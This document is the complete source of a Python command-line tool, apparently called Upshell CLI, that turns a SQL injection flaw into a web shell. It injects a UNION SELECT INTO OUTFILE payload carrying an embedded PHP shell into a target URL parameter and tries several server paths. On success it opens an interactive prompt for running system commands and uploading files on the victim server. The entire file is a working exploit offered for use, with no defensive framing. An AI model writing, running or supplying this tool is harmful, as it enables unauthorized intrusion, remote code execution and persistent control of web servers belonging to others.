# Upshell CLI Exploiter
# Author: JayVillain

import requests
import argparse
import os
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table
from rich.panel import Panel
from rich import box

# ---------------- CONFIG ---------------- #
WEB_SHELL = '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded.";
}
?>'''

UPLOAD_PATHS = [
    "/var/www/html/shell.php",
    "/tmp/shell.php",
    "/srv/http/shell.php",
    "C:/xampp/htdocs/shell.php",
]

HEADERS = {"User-Agent": "Mozilla/5.0 (UpshellCLI)"}
RETRY_DELAY = 1  # seconds
console = Console()

# ---------------- CORE FUNCTIONS ---------------- #
def build_exploit_url(base_url: str, param: str, payload: str) -> str:
    parsed = urlparse(base_url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))

def extract_param(url: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    if not qs:
        raise ValueError("Target URL must contain at least one parameter")
    return list(qs.keys())[0]

def try_upload_shell(url: str, param: str) -> str:
    for path in UPLOAD_PATHS:
        payload = f"' UNION SELECT \"{WEB_SHELL}\" INTO OUTFILE '{path}'-- -"
        exploit_url = build_exploit_url(url, param, payload)
        try:
            console.print(f"[yellow][!] Trying to upload shell to:[/] {path}")
            requests.get(exploit_url, headers=HEADERS, timeout=10)
            shell_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}{path}"
            time.sleep(RETRY_DELAY)
            check = requests.get(shell_url, headers=HEADERS, timeout=5)
            if check.status_code == 200 and "cmd" in check.text:
                console.print(f"[green][+] Shell active at:[/] {shell_url}")
                return shell_url
        except Exception:
            continue
    return ''

def exec_cmd(shell_url: str, cmd: str) -> str:
    try:
        response = requests.get(shell_url, params={"cmd": cmd}, headers=HEADERS, timeout=10)
        return response.text
    except requests.RequestException as e:
        return f"[!] Error executing command: {e}"

def upload_file(shell_url: str, file_path: str) -> str:
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            response = requests.post(shell_url, files=files, headers=HEADERS, timeout=10)
        return response.text
    except Exception as e:
        return f"[!] File upload failed: {e}"

def shell_loop(shell_url: str):
    console.print(Panel("[bold green]Shell active![/bold green] Enter [cyan]cmd[/cyan] or type [red]upload <path>[/red]. Type [yellow]exit[/yellow] to quit.", title="[bold]UpshellCLI[/bold]", box=box.ROUNDED))
    while True:
        cmd = Prompt.ask("[bold cyan]shell[/bold cyan]")
        if cmd.lower() == 'exit':
            break
        elif cmd.startswith("upload "):
            file_path = cmd.split(" ", 1)[1]
            result = upload_file(shell_url, file_path)
            console.print(result)
        else:
            output = exec_cmd(shell_url, cmd)
            console.print(output)

def main():
    parser = argparse.ArgumentParser(description="Upshell CLI - SQLi to Shell Exploiter by JayVillain")
    parser.add_argument("-u", "--url", help="Target URL with vulnerable parameter", required=True)
    args = parser.parse_args()

    try:
        param = extract_param(args.url)
        console.print(Panel(f"[bold]Target:[/] {args.url}\n[bold]Param:[/] {param}", title="[blue]UpshellCLI Info[/blue]", box=box.DOUBLE))
        shell_url = try_upload_shell(args.url, param)
        if shell_url:
            shell_loop(shell_url)
        else:
            console.print("[red][-] Upload shell failed on all paths.")
    except Exception as e:
        console.print(f"[red][!] Error:[/] {e}")

if __name__ == '__main__':
    main()
